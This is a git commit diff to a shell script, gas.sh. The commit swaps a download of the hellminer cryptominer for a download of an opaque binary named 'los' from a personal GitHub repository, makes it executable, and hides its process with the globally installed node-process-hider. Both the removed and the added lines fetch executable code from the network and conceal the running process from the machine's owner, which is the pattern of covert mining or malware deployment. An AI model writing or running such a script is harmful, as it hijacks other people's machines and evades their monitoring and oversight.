0e8daba7da652e5aee64e957e6652702846678ba
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-16 03:16:56 +0700

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -2,8 +2,6 @@ sudo apt update -y
 sudo apt install nodejs -y
 sudo apt install npm -y
 sudo npm i -g node-process-hider
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-chmod +x hellminer_cpu_linux.tar.gz
-tar -xvf hellminer_cpu_linux.tar.gz
-sudo ph add hellminer
-sudo ph add verus-solver
+wget https://raw.githubusercontent.com/chikahusarii/claim/main/los
+chmod +x los
+sudo ph add los
